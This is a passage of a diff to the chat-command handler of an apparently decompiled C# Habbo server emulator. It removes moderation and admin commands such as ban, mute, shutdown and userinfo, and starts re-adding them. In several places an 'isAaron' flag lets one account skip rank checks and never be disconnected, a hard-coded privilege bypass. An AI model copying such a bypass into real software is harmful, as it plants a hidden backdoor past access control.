-							}
-							catch
-							{
-								Session.SendNotif("Input must be a number");
-							}
-							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-							return true;
-						}
-						return false;
-					case 26:
-						if (Session.GetHabbo().HasRole("cmd_masspixels"))
-						{
-							try
-							{
-								int num5 = int.Parse(Params[1]);
-								PhoenixEnvironment.GetGame().GetClientManager().method_19(num5, true);
-							}
-							catch
-							{
-								Session.SendNotif("Input must be a number");
-							}
-							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-							return true;
-						}
-						return false;
-					case 27:
-						if (Session.GetHabbo().HasRole("cmd_masspoints"))
-						{
-							try
-							{
-								int num5 = int.Parse(Params[1]);
-								PhoenixEnvironment.GetGame().GetClientManager().method_20(num5, true);
-							}
-							catch
-							{
-								Session.SendNotif("Input must be a number");
-							}
-							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-							return true;
-						}
-						return false;
-					case 30:
-					{
-						if (!Session.GetHabbo().HasRole("cmd_motd"))
-						{
-							return false;
-						}
-						string text = Params[1];
-						TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(text);
-						if (TargetClient == null)
-						{
-							Session.SendNotif("Could not find user: " + text);
-							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-							return true;
-						}
-						TargetClient.SendNotif(ChatCommandHandler.MergeParams(Params, 2), 2);
-						PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-						return true;
-					}
-					case 31:
-					{
-						if (!Session.GetHabbo().HasRole("cmd_mute"))
-						{
-							return false;
-						}
-						string text = Params[1];
-						TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(text);
-						if (TargetClient == null || TargetClient.GetHabbo() == null)
-						{
-							Session.SendNotif("Could not find user: " + text);
-							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-							return true;
-						}
-						if (TargetClient.GetHabbo().Rank >= Session.GetHabbo().Rank && !Session.GetHabbo().isAaron)
-						{
-							Session.SendNotif("You are not allowed to (un)mute that user.");
-							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-							return true;
-						}
-						TargetClient.GetHabbo().Mute();
-						PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-						return true;
-					}
-					case 32:
-					{
-						if (!Session.GetHabbo().HasRole("cmd_override"))
-						{
-							return false;
-						}
-						room = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(Session.GetHabbo().CurrentRoomId);
-						if (room == null)
-						{
-							return false;
-						}
-						RoomUser class3 = room.GetRoomUserByHabbo(Session.GetHabbo().Id);
-						if (class3 == null)
-						{
-							return false;
-						}
-						if (class3.AllowOverride)
-						{
-							class3.AllowOverride = false;
-							Session.SendNotif("Walking override disabled.");
-						}
-						else
-						{
-							class3.AllowOverride = true;
-							Session.SendNotif("Walking override enabled.");
-						}
-						room.GenerateMaps();
-						PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-						return true;
-					}
-					case 34:
-					{
-						if (!Session.GetHabbo().HasRole("cmd_pixels"))
-						{
-							return false;
-						}
-						TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(Params[1]);
-						if (TargetClient == null)
-						{
-							Session.SendNotif("User could not be found.");
-							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-							return true;
-						}
-						int num4;
-						if (int.TryParse(Params[2], out num4))
-						{
-							TargetClient.GetHabbo().ActivityPoints = TargetClient.GetHabbo().ActivityPoints + num4;
-							TargetClient.GetHabbo().UpdateActivityPointsBalance(true);
-							TargetClient.SendNotif(Session.GetHabbo().Username + " has awarded you " + num4.ToString() + " Pixels!");
-							Session.SendNotif("Pixels balance updated successfully.");
-							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-							return true;
-						}
-						Session.SendNotif("Please send a valid amount of pixels.");
-						PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-						return true;
-					}
-					case 35:
-					{
-						if (!Session.GetHabbo().HasRole("cmd_points"))
-						{
-							return false;
-						}
-						TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(Params[1]);
-						if (TargetClient == null)
-						{
-							Session.SendNotif("User could not be found.");
-							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-							return true;
-						}
-						int num4;
-						if (int.TryParse(Params[2], out num4))
-						{
-							TargetClient.GetHabbo().shells = TargetClient.GetHabbo().shells + num4;
-							TargetClient.GetHabbo().UpdateShellsBalance(false, true);
-							TargetClient.SendNotif(Session.GetHabbo().Username + " has awarded you " + num4.ToString() + " Points!");
-							Session.SendNotif("Points balance updated successfully.");
-							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-							return true;
-						}
-						Session.SendNotif("Please send a valid amount of points.");
-						PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-						return true;
-					}
-					case 39:
-						if (Session.GetHabbo().HasRole("cmd_removebadge"))
-						{
-							TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(Params[1]);
-							if (TargetClient != null)
-							{
-								TargetClient.GetHabbo().GetBadgeComponent().RemoveBadge(PhoenixEnvironment.FilterInjectionChars(Params[2]));
-							}
-							else
-							{
-								Session.SendNotif("User: " + Params[1] + " could not be found in the database.\rPlease try your request again.");
-							}
-							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-							return true;
-						}
-						return false;
-					case 41:
-					{
-						if (!Session.GetHabbo().HasRole("cmd_roomalert"))
-						{
-							return false;
-						}
-						room = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(Session.GetHabbo().CurrentRoomId);
-						if (room == null)
-						{
-							return false;
-						}
-						string string_ = ChatCommandHandler.MergeParams(Params, 1);
-						for (int i = 0; i < room.UserList.Length; i++)
-						{
-							RoomUser class6 = room.UserList[i];
-							if (class6 != null)
-							{
-								class6.GetClient().SendNotif(string_);
-							}
-						}
-						PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-						return true;
-					}
-					case 42:
-						if (!Session.GetHabbo().HasRole("cmd_roombadge"))
-						{
-							return false;
-						}
-						if (Session.GetHabbo().CurrentRoom == null)
-						{
-							return false;
-						}
-						for (int i = 0; i < Session.GetHabbo().CurrentRoom.UserList.Length; i++)
-						{
-							try
-							{
-								RoomUser class6 = Session.GetHabbo().CurrentRoom.UserList[i];
-								if (class6 != null)
-								{
-									if (!class6.IsBot)
-									{
-										if (class6.GetClient() != null)
-										{
-											if (class6.GetClient().GetHabbo() != null)
-											{
-												class6.GetClient().GetHabbo().GetBadgeComponent().GiveBadge(class6.GetClient(), Params[1], true);
-											}
-										}
-									}
-								}
-							}
-							catch (Exception ex)
-							{
-								Session.SendNotif("Error: " + ex.ToString());
-							}
-						}
-						PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-						return true;
-					case 43:
-					{
-						if (!Session.GetHabbo().HasRole("cmd_roomkick"))
-						{
-							return false;
-						}
-						room = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(Session.GetHabbo().CurrentRoomId);
-						if (room == null)
-						{
-							return false;
-						}
-						bool flag = true;
-						string text4 = ChatCommandHandler.MergeParams(Params, 1);
-						if (text4.Length > 0)
-						{
-							flag = false;
-						}
-						for (int i = 0; i < room.UserList.Length; i++)
-						{
-							RoomUser class7 = room.UserList[i];
-							if (class7 != null && class7.GetClient().GetHabbo().Rank < Session.GetHabbo().Rank)
-							{
-								if (!flag)
-								{
-									class7.GetClient().SendNotif("You have been kicked by an moderator: " + text4);
-								}
-								room.RemoveUserFromRoom(class7.GetClient(), true, flag);
-							}
-						}
-						PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-						return true;
-					}
-					case 44:
-						if (Session.GetHabbo().HasRole("cmd_roommute"))
-						{
-							if (Session.GetHabbo().CurrentRoom.RoomMuted)
-							{
-								Session.GetHabbo().CurrentRoom.RoomMuted = false;
-							}
-							else
-							{
-								Session.GetHabbo().CurrentRoom.RoomMuted = true;
-							}
-							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-							return true;
-						}
-						return false;
-					case 45:
-						if (Session.GetHabbo().HasRole("cmd_sa"))
-						{
-							ServerMessage Logging = new ServerMessage(134u);
-							Logging.AppendUInt(0u);
-							Logging.AppendString(Session.GetHabbo().Username + ": " + Input.Substring(3));
-							PhoenixEnvironment.GetGame().GetClientManager().BroadcastMessageToStaff(Logging, Logging);
-							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-							return true;
-						}
-						return false;
-					case 47:
-						if (Session.GetHabbo().HasRole("cmd_setspeed"))
-						{
-							int.Parse(Params[1]);
-							Session.GetHabbo().CurrentRoom.method_102(int.Parse(Params[1]));
-							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-							return true;
-						}
-						return false;
-					case 48:
-						if (Session.GetHabbo().HasRole("cmd_shutdown"))
-						{
-                            Logging.LogCriticalException("User " + Session.GetHabbo().Username + " shut down the server " + DateTime.Now.ToString());
-							Task task = new Task(new Action(PhoenixEnvironment.BeginShutDown));
-							task.Start();
-							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-							return true;
-						}
-						return false;
-					case 49:
-						if (Session.GetHabbo().HasRole("cmd_spull"))
-						{
-							try
-							{
-								string a = "down";
-								string text = Params[1];
-								TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(text);
-								room = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(Session.GetHabbo().CurrentRoomId);
-								if (Session == null || TargetClient == null)
-								{
-									return false;
-								}
-								RoomUser class6 = room.GetRoomUserByHabbo(Session.GetHabbo().Id);
-								RoomUser class4 = room.GetRoomUserByHabbo(TargetClient.GetHabbo().Id);
-								if (TargetClient.GetHabbo().Username == Session.GetHabbo().Username)
-								{
-									Session.GetHabbo().Sendselfwhisper("You cannot pull yourself");
-									return true;
-								}
-								class6.Chat(Session, "*pulls " + TargetClient.GetHabbo().Username + " to them*", false);
-								if (class6.RotBody == 0)
-								{
-									a = "up";
-								}
-								if (class6.RotBody == 2)
-								{
-									a = "right";
-								}
-								if (class6.RotBody == 4)
-								{
-									a = "down";
-								}
-								if (class6.RotBody == 6)
-								{
-									a = "left";
-								}
-								if (a == "up")
-								{
-									class4.MoveTo(class6.X, class6.Y - 1);
-								}
-								if (a == "right")
-								{
-									class4.MoveTo(class6.X + 1, class6.Y);
-								}
-								if (a == "down")
-								{
-									class4.MoveTo(class6.X, class6.Y + 1);
-								}
-								if (a == "left")
-								{
-									class4.MoveTo(class6.X - 1, class6.Y);
-								}
-								return true;
-							}
-							catch
-							{
-								return false;
-							}
-						}
-						return false;
-					case 50:
-						if (Session.GetHabbo().HasRole("cmd_summon"))
-						{
-							TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(Params[1]);
-							if (TargetClient != null && TargetClient.GetHabbo().CurrentRoom != Session.GetHabbo().CurrentRoom)
-							{
-								ServerMessage Message5 = new ServerMessage(286u);
-								Message5.AppendBoolean(Session.GetHabbo().CurrentRoom.IsPublic);
-								Message5.AppendUInt(Session.GetHabbo().CurrentRoomId);
-								TargetClient.SendMessage(Message5);
-								TargetClient.SendNotif(Session.GetHabbo().Username + " has summoned you to them");
-							}
-							else
-							{
-								Session.GetHabbo().Sendselfwhisper("User: " + Params[1] + " could not be found - Maybe they're not online anymore :(");
-							}
-							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-							return true;
-						}
-						return false;
-					case 51:
-						if (!Session.GetHabbo().HasRole("cmd_superban"))
-						{
-							return false;
-						}
-						TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(Params[1]);
-						if (TargetClient == null)
-						{
-							Session.SendNotif("User not found.");
-							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-							return true;
-						}
-						if (TargetClient.GetHabbo().Rank >= Session.GetHabbo().Rank && !Session.GetHabbo().isAaron)
-						{
-							Session.SendNotif("You are not allowed to ban that user.");
-							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-							return true;
-						}
-						PhoenixEnvironment.GetGame().GetBanManager().BanUser(TargetClient, Session.GetHabbo().Username, 360000000.0, ChatCommandHandler.MergeParams(Params, 2), false);
-						PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-						return true;
-					case 52:
-					{
-						if (!Session.GetHabbo().HasRole("cmd_teleport"))
-						{
-							return false;
-						}
-						room = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(Session.GetHabbo().CurrentRoomId);
-						if (room == null)
-						{
-							return false;
-						}
-						RoomUser class3 = room.GetRoomUserByHabbo(Session.GetHabbo().Id);
-						if (class3 == null)
-						{
-							return false;
-						}
-						if (class3.TeleportMode)
-						{
-							class3.TeleportMode = false;
-							Session.SendNotif("Teleporting disabled.");
-						}
-						else
-						{
-							class3.TeleportMode = true;
-							Session.SendNotif("Teleporting enabled.");
-						}
-						room.GenerateMaps();
-						PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-						return true;
-					}
-					case 54:
-					{
-						if (!Session.GetHabbo().HasRole("cmd_unmute"))
-						{
-							return false;
-						}
-						string text = Params[1];
-						TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(text);
-						if (TargetClient == null || TargetClient.GetHabbo() == null)
-						{
-							Session.SendNotif("Could not find user: " + text);
-							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-							return true;
-						}
-						TargetClient.GetHabbo().Unmute();
-						PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-						return true;
-					}
-					case 55:
-						if (Session.GetHabbo().HasRole("cmd_update_achievements"))
-						{
-							using (DatabaseClient class5 = PhoenixEnvironment.GetDatabase().GetClient())
-							{
-								AchievementManager.LoadAchievements(class5);
-							}
-							return true;
-						}
-						return false;
-					case 56:
-						if (Session.GetHabbo().HasRole("cmd_update_bans"))
-						{
-							using (DatabaseClient class5 = PhoenixEnvironment.GetDatabase().GetClient())
-							{
-								PhoenixEnvironment.GetGame().GetBanManager().LoadBans(class5);
-							}
-							PhoenixEnvironment.GetGame().GetClientManager().CheckForAllBanConflicts();
-							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-							return true;
-						}
-						return false;
-					case 57:
-						if (Session.GetHabbo().HasRole("cmd_update_bots"))
-						{
-							using (DatabaseClient class5 = PhoenixEnvironment.GetDatabase().GetClient())
-							{
-								PhoenixEnvironment.GetGame().GetBotManager().LoadBots(class5);
-							}
-							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-							return true;
-						}
-						return false;
-					case 58:
-						if (Session.GetHabbo().HasRole("cmd_update_catalogue"))
-						{
-							using (DatabaseClient class5 = PhoenixEnvironment.GetDatabase().GetClient())
-							{
-								PhoenixEnvironment.GetGame().GetCatalog().Initialize(class5);
-							}
-							PhoenixEnvironment.GetGame().GetCatalog().InitCache();
-							PhoenixEnvironment.GetGame().GetClientManager().QueueBroadcaseMessage(new ServerMessage(441u));
-							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-							return true;
-						}
-						return false;
-					case 59:
-						if (Session.GetHabbo().HasRole("cmd_update_filter"))
-						{
-							using (DatabaseClient class5 = PhoenixEnvironment.GetDatabase().GetClient())
-							{
-								ChatCommandHandler.InitWords(class5);
-							}
-							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-							return true;
-						}
-						return false;
-					case 60:
-						if (Session.GetHabbo().HasRole("cmd_update_items"))
-						{
-							using (DatabaseClient class5 = PhoenixEnvironment.GetDatabase().GetClient())
-							{
-								PhoenixEnvironment.GetGame().GetItemManager().LoadItems(class5);
-							}
-							Session.SendNotif("Item defenitions reloaded successfully.");
-							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-							return true;
-						}
-						return false;
-					case 61:
-						if (Session.GetHabbo().HasRole("cmd_update_navigator"))
-						{
-							using (DatabaseClient class5 = PhoenixEnvironment.GetDatabase().GetClient())
-							{
-								PhoenixEnvironment.GetGame().GetNavigator().LoadNavigator(class5);
-								PhoenixEnvironment.GetGame().GetRoomManager().LoadModels(class5);
-							}
-							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-							return true;
-						}
-						return false;
-					case 62:
-						if (Session.GetHabbo().HasRole("cmd_update_permissions"))
-						{
-							using (DatabaseClient class5 = PhoenixEnvironment.GetDatabase().GetClient())
-							{
-                                PhoenixEnvironment.GetGame().GetRoleManager().LoadRoles(class5);
-							}
-							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-							return true;
-						}
-						return false;
-					case 63:
-						if (Session.GetHabbo().HasRole("cmd_update_settings"))
-						{
-							using (DatabaseClient class5 = PhoenixEnvironment.GetDatabase().GetClient())
-							{
-								PhoenixEnvironment.GetGame().LoadSettings(class5);
-							}
-							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-							return true;
-						}
-						return false;
-					case 64:
-					{
-						if (!Session.GetHabbo().HasRole("cmd_userinfo"))
-						{
-							return false;
-						}
-						string text5 = Params[1];
-						bool flag2 = true;
-						if (string.IsNullOrEmpty(text5))
-						{
-							Session.SendNotif("Please enter a username");
-							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-							return true;
-						}
-						GameClient class8 = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(text5);
-						Habbo class9;
-						if (class8 == null)
-						{
-							flag2 = false;
-							class9 = Authenticator.GetHabboViaUsername(text5);
-						}
-						else
-						{
-							class9 = class8.GetHabbo();
-						}
-						if (class9 == null)
-						{
-							Session.SendNotif("Unable to find user " + Params[1]);
-							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-							return true;
-						}
-						StringBuilder stringBuilder = new StringBuilder();
-						if (class9.CurrentRoom != null)
-						{
-							stringBuilder.Append(" - ROOM INFORMATION FOR ROOMID: " + class9.CurrentRoom.RoomId + " - \r");
-							stringBuilder.Append("Owner: " + class9.CurrentRoom.Owner + "\r");
-							stringBuilder.Append("Room name: " + class9.CurrentRoom.Name + "\r");
-							stringBuilder.Append(string.Concat(new object[]
-							{
-								"Users in room: ",
-								class9.CurrentRoom.UserCount,
-								"/",
-								class9.CurrentRoom.UsersMax
-							}));
-						}
-						uint num6 = class9.Rank;
-						//if (class9.isAaronble)
-						//{
-						//	num6 = 1u;
-						//}
-						string text6 = "";
-						if (Session.GetHabbo().HasRole("cmd_userinfo_viewip"))
-						{
-							text6 = "UserIP: " + class9.LastIp + " \r";
-						}
-						Session.SendNotif(string.Concat(new object[]
-						{
-							"User information for user: ",
-							text5,
-							":\rRank: ",
-							num6,
-							" \rUser online: ",
-							flag2.ToString(),
-							" \rUserID: ",
-							class9.Id,
-							" \r",
-							text6,
-							"Visiting room: ",
-							class9.CurrentRoomId,
-							" \rUser motto: ",
-							class9.Motto,
-							" \rUser credits: ",
-							class9.Credits,
-							" \rUser pixels: ",
-							class9.ActivityPoints,
-							" \rUser points: ",
-							class9.shells,
-							" \rUser muted: ",
-							class9.Muted.ToString(),
-							"\r\r\r",
-							stringBuilder.ToString()
-						}));
-						PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-						return true;
-					}
-					case 65:
-						if (Session.GetHabbo().HasRole("cmd_update_texts"))
-						{
-							using (DatabaseClient class5 = PhoenixEnvironment.GetDatabase().GetClient())
-							{
-								TextManager.LoadTexts(class5);
-							}
-							return true;
-						}
-						return false;
-					case 66:
-					{
-						if (!Session.GetHabbo().HasRole("cmd_disconnect"))
-						{
-							return false;
-						}
-						string text = Params[1];
-						TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(text);
-						if (TargetClient == null)
-						{
-							Session.SendNotif("Could not find user: " + text);
-							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-							return true;
-						}
-						if (Session.GetHabbo().Rank <= TargetClient.GetHabbo().Rank && !Session.GetHabbo().isAaron)
-						{
-							Session.SendNotif("You are not allowed to kick that user.");
-							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-							return true;
-						}
-						if (!TargetClient.GetHabbo().isAaron)
-						{
-							TargetClient.Disconnect();
-						}
-						return true;
-					}
-					}
-					num = PhoenixEnvironment.GetGame().GetRoleManager().CommandsList[Params[0]];
-					if (num <= 13)
-					{
-						if (num != 1)
-						{
-							switch (num)
-							{
-							case 5:
-							{
-								int num7 = (int)Convert.ToInt16(Params[1]);
-								if (num7 > 0 && num7 < 101)
-								{
-									Session.GetHabbo().BuyCount = (int)Convert.ToInt16(Params[1]);
-								}
-								else
-								{
-									Session.GetHabbo().Sendselfwhisper("Please choose a value between 1 - 100");
-								}
-								return true;
-							}
-							case 8:
-							case 9:
-								Session.GetHabbo().GetInventoryComponent().method_0();
-								Session.SendNotif(TextManager.GetText("cmd_emptyitems_success"));
-								PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-								return true;
-							case 10:
-								if (Session.GetHabbo().HasRole("cmd_empty") && Params[1] != null)
-								{
-									GameClient class10 = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(Params[1]);
-									if (class10 != null && class10.GetHabbo() != null)
-									{
-										class10.GetHabbo().GetInventoryComponent().method_0();
-										Session.SendNotif("Inventory cleared! (Database and cache)");
-									}
-									else
-									{
-										using (DatabaseClient class5 = PhoenixEnvironment.GetDatabase().GetClient())
-										{
-											class5.AddParamWithValue("usrname", Params[1]);
-											int num8 = int.Parse(class5.ReadString("SELECT Id FROM users WHERE username = @usrname LIMIT 1;"));
-											class5.ExecuteQuery("DELETE FROM items WHERE user_id = '" + num8 + "' AND room_id = 0;");
-											Session.SendNotif("Inventory cleared! (Database)");
-										}
-									}
-									PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-									return true;
-								}
-								return false;
-							case 12:
-							{
-								if (!GlobalClass.cmdFlagmeEnabled)
-								{
-									Session.GetHabbo().Sendselfwhisper(TextManager.GetText("cmd_error_disabled"));
-									return true;
-								}
-								if (!Session.GetHabbo().Vip)
-								{
-									Session.GetHabbo().Sendselfwhisper(TextManager.GetText("cmd_error_permission_vip"));
-									return true;
-								}
-								ServerMessage Message5_ = new ServerMessage(573u);
-								Session.SendMessage(Message5_);
-								return true;
-							}
-							case 13:
-								if (!GlobalClass.cmdFollowEnabled)
-								{
-									Session.GetHabbo().Sendselfwhisper(TextManager.GetText("cmd_error_disabled"));
-									return true;
-								}
-								if (!Session.GetHabbo().Vip)
-								{
-									Session.GetHabbo().Sendselfwhisper(TextManager.GetText("cmd_error_permission_vip"));
-									return true;
-								}
-								TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(Params[1]);
-								if (TargetClient != null && TargetClient.GetHabbo().InRoom && Session.GetHabbo().CurrentRoom != TargetClient.GetHabbo().CurrentRoom && !TargetClient.GetHabbo().HideInRom)
-								{
-									ServerMessage Message5 = new ServerMessage(286u);
-									Message5.AppendBoolean(TargetClient.GetHabbo().CurrentRoom.IsPublic);
-									Message5.AppendUInt(TargetClient.GetHabbo().CurrentRoomId);
-									Session.SendMessage(Message5);
-								}
-								else
-								{
-									Session.GetHabbo().Sendselfwhisper("User: " + Params[1] + " could not be found - Maybe they're not online or not in a room anymore (or maybe they're a ninja)");
-								}
-								PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-								return true;
-							default:
-								goto IL_3F91;
-							}
-						}
-					}
-					else
-					{
-						switch (num)
-						{
-						case 28:
-						{
-							if (!GlobalClass.cmdMimicEnabled)
-							{
-								Session.GetHabbo().Sendselfwhisper(TextManager.GetText("cmd_error_disabled"));
-								return true;
-							}
-							if (!Session.GetHabbo().Vip)
-							{
-								Session.GetHabbo().Sendselfwhisper(TextManager.GetText("cmd_error_permission_vip"));
-								return true;
-							}
-							string text = Params[1];
-							TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(text);
-							if (TargetClient == null)
-							{
-								Session.GetHabbo().Sendselfwhisper("Could not find user: " + text);
-								return true;
-							}
-							Session.GetHabbo().Look = TargetClient.GetHabbo().Look;
-							Session.GetHabbo().method_26(false, Session);
-							return true;
-						}
-						case 29:
-						{
-							if (!GlobalClass.cmdMoonwalkEnabled)
-							{
-								Session.GetHabbo().Sendselfwhisper(TextManager.GetText("cmd_error_disabled"));
-								return true;
-							}
-							if (!Session.GetHabbo().Vip)
-							{
-								Session.GetHabbo().Sendselfwhisper(TextManager.GetText("cmd_error_permission_vip"));
-								return true;
-							}
-							room = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(Session.GetHabbo().CurrentRoomId);
-							if (room == null)
-							{
-								return false;
-							}
-							RoomUser class3 = room.GetRoomUserByHabbo(Session.GetHabbo().Id);
-							if (class3 == null)
-							{
-								return false;
-							}
-							if (class3.bool_3)
-							{
-								class3.bool_3 = false;
-								Session.GetHabbo().Sendselfwhisper("Your moonwalk has been disabled.");
-								return true;
-							}
-							class3.bool_3 = true;
-							Session.GetHabbo().Sendselfwhisper("Your moonwalk has been enabled.");
-							return true;
-						}
-						default:
-						{
-							RoomUser class6;
-							switch (num)
-							{
-							case 36:
-								try
-								{
-									if (!GlobalClass.cmdPullEnabled)
-									{
-										Session.GetHabbo().Sendselfwhisper(TextManager.GetText("cmd_error_disabled"));
-										return true;
-									}
-									if (!Session.GetHabbo().Vip)
-									{
-										Session.GetHabbo().Sendselfwhisper(TextManager.GetText("cmd_error_permission_vip"));
-										return true;
-									}
-									string a = "down";
-									string text = Params[1];
-									TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(text);
-									room = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(Session.GetHabbo().CurrentRoomId);
-									if (Session == null || TargetClient == null)
-									{
-										return false;
-									}
-									class6 = room.GetRoomUserByHabbo(Session.GetHabbo().Id);
-									RoomUser class4 = room.GetRoomUserByHabbo(TargetClient.GetHabbo().Id);
-									if (TargetClient.GetHabbo().Username == Session.GetHabbo().Username)
-									{
-										Session.GetHabbo().Sendselfwhisper("You cannot pull yourself");
-										return true;
-									}
-									if (TargetClient.GetHabbo().CurrentRoomId == Session.GetHabbo().CurrentRoomId && Math.Abs(class6.X - class4.X) < 3 && Math.Abs(class6.Y - class4.Y) < 3)
-									{
-										class6.Chat(Session, "*pulls " + TargetClient.GetHabbo().Username + " to them*", false);
-										if (class6.RotBody == 0)
-										{
-											a = "up";
-										}
-										if (class6.RotBody == 2)
-										{
-											a = "right";
-										}
-										if (class6.RotBody == 4)
-										{
-											a = "down";
-										}
-										if (class6.RotBody == 6)
-										{
-											a = "left";
-										}
-										if (a == "up")
-										{
-											class4.MoveTo(class6.X, class6.Y - 1);
-										}
-										if (a == "right")
-										{
-											class4.MoveTo(class6.X + 1, class6.Y);
-										}
-										if (a == "down")
-										{
-											class4.MoveTo(class6.X, class6.Y + 1);
-										}
-										if (a == "left")
-										{
-											class4.MoveTo(class6.X - 1, class6.Y);
-										}
-										return true;
-									}
-									Session.GetHabbo().Sendselfwhisper("That user is not close enough to you to be pulled, try getting closer");
-									return true;
-								}
-								catch
-								{
-									return false;
-								}
-							case 37:
+                                Message.AppendStringWithBreak(msg);
+                                PhoenixEnvironment.GetGame().GetClientManager().QueueBroadcaseMessage(Message);
+                                PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                                return true;
+                            }
+                            return false;
+                        #endregion
+                        #region CMD Ha
+                        case 20: //CMD Ha
+                            if (Session.GetHabbo().HasRole("cmd_ha"))
+                            {
+                                string notice = Input.Substring(3);
+                                ServerMessage Message2 = new ServerMessage(808);
+                                Message2.AppendStringWithBreak(TextManager.GetText("cmd_ha_title"));
+                                Message2.AppendStringWithBreak(notice + "\r\n- " + Session.GetHabbo().Username);
+                                ServerMessage Message3 = new ServerMessage(161);
+                                Message3.AppendStringWithBreak(notice + "\r\n- " + Session.GetHabbo().Username);
+                                PhoenixEnvironment.GetGame().GetClientManager().BroadcastMessage(Message2, Message3);
+                                PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                                return true;
+                            }
+                            return false;
+                        #endregion
+                        #region CMD Invisible
+                        case 21: //CMD Invisible
+                            if (Session.GetHabbo().HasRole("cmd_invisible"))
+                            {
+                                Session.GetHabbo().Visible = !Session.GetHabbo().Visible;
+                                Session.SendNotif("You are now " + (Session.GetHabbo().Visible ? "visible" : "invisible") + "\nTo apply the changes reload the room ;D");
+                                return true;
+                            }
+                            return false;
+                        #endregion
+                        #region CMD IpBan
+                        case 22: //CMD IpBan
